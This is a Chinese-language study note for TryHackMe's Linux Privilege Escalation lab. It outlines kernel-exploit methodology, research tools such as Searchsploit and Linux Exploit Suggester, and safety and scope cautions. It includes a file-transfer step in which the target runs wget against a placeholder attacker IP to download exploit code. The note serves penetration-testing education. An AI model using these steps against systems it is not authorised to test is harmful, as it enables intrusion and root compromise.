> [!info] LINK & TAG
> [TryHackMe | Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
> 
> #tag

## 1. 提權概述 (Overview)

提權的目標是從低權限帳戶獲取 **Root 權限** 或擁有更高權限的帳戶。

- **途徑 A**：直接利用漏洞獲取 root shell。
    
- **途徑 B**：透過存取其他具備更多資訊或權限的使用者帳戶來間接達成。
    
- **核心依據**：除非有直接漏洞，否則提權通常依賴於系統的**錯誤設定 (Misconfigurations)** 與**鬆散的權限管理 (Lax Permissions)**。
    

---

## 2. 核心漏洞利用 (Kernel Exploit)

核心（Kernel）負責管理應用程式與硬體（如記憶體）之間的通訊。由於核心運作時具備極高權限，一旦被成功利用，攻擊者通常能直接獲得 Root 權限。

### 執行方法學 (Methodology)

1. **識別 (Identify)**：確認目標系統的核心版本（使用 `uname -a` 或 `cat /proc/version`）。
    
2. **搜尋 (Search)**：尋找適用於該核心版本的漏洞利用程式碼 (Exploit code)。
    
3. **執行 (Run)**：編譯並執行該 Exploit。
    

> [!CAUTION]
> 
> 風險警告：核心漏洞利用失敗極可能導致 系統崩潰 (System Crash)。在進行滲透測試前，務必確認此風險是否在專案範圍（Scope）允許內。

---

## 3. 資源與工具 (Research Sources)

- **搜尋引擎**：使用 Google 搜尋特定的核心版本漏洞。
    
- **資料庫**：
    
    - [CVE Details](https://www.cvedetails.com/)：查詢漏洞細節與 CVE 編號。
        
    - **Exploit-db / Searchsploit**：離線或線上的漏洞代碼庫。
        
- **自動化指令碼**：
    
    - **LES (Linux Exploit Suggester)**：自動分析系統環境並建議潛在漏洞。
        
    - _注意_：這類工具可能存在 **誤報 (False Positives)** 或 **漏報 (False Negatives)**。
        

---

## 4. 關鍵提示與注意事項 (Hints & Notes)

### 搜尋技巧

- 搜尋時，關鍵字不要過於死板（例如：核心版本 `4.4.0-31-generic`，搜尋時可以嘗試 `Linux Kernel 4.4.0 Exploit`）。
    

### 安全守則

- **預讀代碼**：在執行任何 Exploit 之前，**務必理解其原理**。有些代碼會對系統做出不可逆的更改，或留下安全隱患，這在正式滲透測試中是不允許的。
    
- **閱讀說明**：許多 Exploit 需要後續互動或特定參數，請詳閱代碼中的註釋（Comments）。
    

### 檔案傳輸技巧

若需將 Exploit 從攻擊機傳送至目標機，可使用：

1. **攻擊機（建立伺服器）**:
    
    
    ```bash
    python3 -m http.server 8000
    ```
    
2. **目標機（下載檔案）**:
    
    
    ```bash
    wget http://[攻擊機IP]:8000/exploit.c
    ```
    

---

## 5. 提權檢查清單 (Quick Checklist)

- [ ] 是否確認核心版本？
    
- [ ] 是否在實驗室環境測試過該 Exploit？
    
- [ ] 是否了解該代碼對系統的影響（是否會重開機、修改帳密等）？
    
- [ ] 若在正式環境，客戶是否知曉系統崩潰的風險？
    
